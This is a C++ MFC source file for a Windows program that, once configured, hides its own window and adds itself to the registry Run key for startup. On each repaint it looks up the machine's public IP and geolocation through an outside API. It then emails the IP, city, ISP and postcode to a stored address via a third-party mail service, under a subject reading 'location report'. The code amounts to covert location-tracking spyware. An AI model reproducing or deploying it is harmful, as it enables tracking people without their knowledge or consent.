
// windows-YANG-programDlg.cpp: 实现文件
//

#include "pch.h"
#include "framework.h"
#include "windows-YANG-program.h"
#include "windows-YANG-programDlg.h"
#include "afxdialogex.h"
#include <json/json.h>
#include <fstream>
#include <afxinet.h>
#ifdef _DEBUG
#define new DEBUG_NEW
#endif
CString pass;
CString email2;
#include <afxinet.h>
CString CwindowsYANGprogramDlg::UTF8ToUnicode2(char* UTF8)
{

	DWORD dwUnicodeLen;        //转换后Unicode的长度
	TCHAR* pwText;            //保存Unicode的指针
	CString strUnicode;        //返回值
	//获得转换后的长度，并分配内存
	dwUnicodeLen = MultiByteToWideChar(CP_UTF8, 0, UTF8, -1, NULL, 0);
	pwText = new TCHAR[dwUnicodeLen];
	if (!pwText)
	{
		return strUnicode;
	}
	//转为Unicode
	MultiByteToWideChar(CP_UTF8, 0, UTF8, -1, pwText, dwUnicodeLen);
	//转为CString
	strUnicode.Format(_T("%s"), pwText);
	//清除内存
	delete[]pwText;
	//返回转换好的Unicode字串
	return strUnicode;
}

// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_ABOUTBOX };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

// 实现
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CwindowsYANGprogramDlg 对话框



CwindowsYANGprogramDlg::CwindowsYANGprogramDlg(CWnd* pParent /*=nullptr*/)
	: CDialogEx(IDD_WINDOWSYANGPROGRAM_DIALOG, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CwindowsYANGprogramDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, ID_POWERBOOT, PowerBootButton);
}

BEGIN_MESSAGE_MAP(CwindowsYANGprogramDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()

	ON_BN_CLICKED(ID_POWERBOOT, &CwindowsYANGprogramDlg::OnBnClickedPowerboot)
	ON_BN_CLICKED(IDC_BUTTON5, &CwindowsYANGprogramDlg::OnBnClickedButton5)
END_MESSAGE_MAP()


// CwindowsYANGprogramDlg 消息处理程序

BOOL CwindowsYANGprogramDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// 将“关于...”菜单项添加到系统菜单中。

	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != nullptr)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	// TODO: 在此添加额外的初始化代码

	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

void CwindowsYANGprogramDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。  对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CwindowsYANGprogramDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
	pass = AfxGetApp()->GetProfileString(_T("Settings"), _T("Pass"), _T("C:\\"));//_T("C:\\")为默认值
	email2 = AfxGetApp()->GetProfileString(_T("Settings"), _T("Email"), _T("C:\\"));//_T("C:\\")为默认值
	if (pass == "1") {
		ShowWindow(HIDE_WINDOW);
	}
	CInternetSession session(_T("HttpClient"));
	TCHAR* url = _T("https://api.vvhan.com/api/getIpInfo");
	CHttpFile* pfile = (CHttpFile*)session.OpenURL(url);
	DWORD dwStatusCode;
	pfile->QueryInfoStatusCode(dwStatusCode);
	if (dwStatusCode == HTTP_STATUS_OK)
	{
		CString content;
		CString data;
		while (pfile->ReadString(data))
		{
			content += data;
		}
		char* pch;
		pch = new char[content.GetLength() * sizeof(TCHAR) + 1];
		memcpy(pch, content, content.GetLength() * sizeof(TCHAR));
		content = UTF8ToUnicode2(pch);//转换编码，不然就乱码了
		//AfxMessageBox(content);
		//CString content2;
	//	content2 = content.Left(content.Find('r'));
	//	content2 = content2.Right(content.GetLength() - 1 - content.ReverseFind(':'));
		//CString contenta;
	//	contenta = content.Left(content.Find('a'));
		//contenta = content.Right(content.GetLength() - 1 - content.ReverseFind(':'));

		CString str = content;
		Json::Reader reader;
		Json::Value root;
		CString temp;
		CString temp2;
		CString temp3;
		CString temp4;
		CString temp5;
		CString temp6;
		CString temp7;
		CString temp8;
		CString temp9;
		CString temp10;
		USES_CONVERSION;
		char* cJson = T2A(str.GetBuffer(0));
		str.ReleaseBuffer();
		if (reader.parse(cJson, root)) {

			temp = root["ip"].asCString();

			temp2 = root["info"]["country"].asCString();

			temp3 = root["info"]["prov"].asCString();
			temp4 = root["info"]["city"].asCString();
			temp5 = root["info"]["lsp"].asCString();
			temp6 = root["info"]["postcode"].asCString();
			;



			temp7 = _T("地址：") + temp + _T("||用户当前所在地： ") + temp2 + temp3 + temp4 + _T("||网络运营商：") + temp5 + _T("||邮政编码：") + temp6;
			wchar_t* unicodeStr = temp7.GetBuffer();
			int unicodeLen = temp7.GetLength();

			std::string utf8Str;
			for (int i = 0; i < unicodeLen; i++) {
				wchar_t ch = unicodeStr[i];
				if (ch < 0x80) {
					utf8Str += static_cast<char>(ch);
				}
				else if (ch < 0x800) {
					utf8Str += static_cast<char>((ch >> 6) | 0xc0);
					utf8Str += static_cast<char>((ch & 0x3f) | 0x80);
				}
				else {
					utf8Str += static_cast<char>((ch >> 12) | 0xe0);
					utf8Str += static_cast<char>(((ch >> 6) & 0x3f) | 0x80);
					utf8Str += static_cast<char>((ch & 0x3f) | 0x80);
				}
			}

			CString encodedUrl;
			int utf8Len = utf8Str.length();
			for (int i = 0; i < utf8Len; i++) {
				unsigned char ch = utf8Str[i];
				char hexStr[4];
				sprintf_s(hexStr, 4, "%%%02X", ch);
				encodedUrl += CString(hexStr);

			}
			temp8 = _T("https://v.api.aa1.cn/api/mail/t/api.php?adress=");
				temp9=_T("&title=SMS%E5%AE%9A%E4%BD%8D%E6%8A%A5%E5%91%8A&content&content=ip") + encodedUrl;
				temp10 = temp8 + email2 + temp9;
			TCHAR* p = (LPTSTR)(LPCTSTR)temp10;
			TCHAR* url2 = p;

			CHttpFile* pfile = (CHttpFile*)session.OpenURL(url2);


		}

	}
	pfile->Close();
	delete pfile;
	session.Close();
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CwindowsYANGprogramDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}


void CwindowsYANGprogramDlg::OnBnClickedPowerboot()
{
	// TODO: 在此添加控件通知处理程序代码
		// TODO: 在此添加控件通知处理程序代码
	HKEY hKey;
	//找到系统的启动项
	CString lpRun = _T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
	//打开启动项
	long lRet = RegOpenKeyEx(HKEY_CURRENT_USER, lpRun, 0, KEY_ALL_ACCESS, &hKey);
	if (lRet != ERROR_SUCCESS)
		MessageBox(_T("打开启动项失败"));
	//找到程序自身路径
	TCHAR pFileName[MAX_PATH] = {};
	GetModuleFileName(NULL, pFileName, MAX_PATH);
	//判断是否已经设置开机启动
	TCHAR PowerBoot[MAX_PATH] = {};
	DWORD nLongth = MAX_PATH;
	long result = RegGetValue(hKey, NULL, _T("PowerBoot"), RRF_RT_REG_SZ, 0, PowerBoot, &nLongth);
	if (result == ERROR_SUCCESS)
	{
		//自启状态;
		//取消自动启动
		lRet = RegDeleteValue(hKey, _T("PowerBoot"));
		if (lRet == ERROR_SUCCESS)
		{
			MessageBox(_T("关闭自启成功"));
			PowerBootButton.SetWindowText(_T("未自启状态"));
		}
	}
	else
	{
		//未自启状态
		//设置自启
		lRet = RegSetValueEx(hKey, _T("PowerBoot"), 0, REG_SZ, (LPBYTE)pFileName, (lstrlen(pFileName) + 1) * sizeof(TCHAR));
		if (lRet == ERROR_SUCCESS)
		{
			MessageBox(_T("设置自启成功"));
			PowerBootButton.SetWindowText(_T("自启状态"));
		}
	}
	//关闭注册表
	RegCloseKey(hKey);
}


void CwindowsYANGprogramDlg::OnBnClickedButton5()
{
	// TODO: 在此添加控件通知处理程序代码
	CString email ;
	GetDlgItem(IDC_EDIT1)->GetWindowText(email);

	AfxGetApp()->WriteProfileString(_T("Settings"), _T("Email"), email);//_localRecPath就是要保存的信息，Settings为注册表子键，LocalRecPath即子键的键值名
	//ShowWindow(HIDE_WINDOW);
	CString pass = _T("1");
	AfxGetApp()->WriteProfileString(_T("Settings"), _T("Pass"), pass);//_localRecPath就是要保存的信息，Settings为注册表子键，LocalRecPath即子键的键值名
}
